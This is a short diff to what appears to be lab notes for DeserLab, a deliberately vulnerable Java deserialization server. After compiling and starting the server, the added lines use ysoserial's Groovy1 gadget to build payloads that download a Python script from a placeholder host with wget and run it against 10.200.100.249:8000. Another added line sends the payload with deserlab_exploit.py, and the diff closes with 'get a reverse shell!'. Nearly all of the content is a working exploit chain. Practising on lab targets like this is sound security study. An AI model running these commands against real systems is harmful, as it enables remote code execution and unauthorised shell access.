@@ -1,2 +1,8 @@
 javac nb/deser/DeserLab.java
 nohup java -cp ".:/home/apps/DeserLab/commons-collections-3.1.jar" nb/deser/DeserLab -server 127.0.0.1 89 &
+java -jar ysoserial-master-SNAPSHOT.jar Groovy1 'wget xxx/x.py -O /tmp/1.py' >payload2
+
+java -jar ysoserial-master-SNAPSHOT.jar Groovy1 'python /tmp/1.py 10.200.100.249 8000' >payload2
+python deserlab_exploit.py 127.0.0.1 89 payload2
+
+get a reverse shell!
